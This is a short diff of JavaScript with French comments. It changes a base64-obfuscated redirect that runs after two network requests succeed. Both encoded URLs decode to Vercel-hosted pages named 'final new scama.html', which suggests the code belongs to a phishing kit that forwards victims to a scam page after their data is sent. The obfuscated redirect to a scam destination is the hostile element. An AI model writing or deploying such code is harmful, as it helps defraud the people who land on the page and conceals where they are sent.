@@ -111,7 +111,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     if (response[0].ok && response[1].ok) {
                         // Redirection vers le lien en base64 en cas de succès
             window.location.href = atob(
-              "aHR0cHM6Ly9maW5hbC1laWdodC1ncmVlbi52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA=="
+              "aHR0cHM6Ly9maW5hbC1wZWFjaC1uaW5lLnZlcmNlbC5hcHAvZmluYWwlMjBuZXclMjBzY2FtYS5odG1s"
             );                    } else {
                         // Gestion de l'échec d'envoi
                     }
@@ -124,3 +124,4 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
 });
+
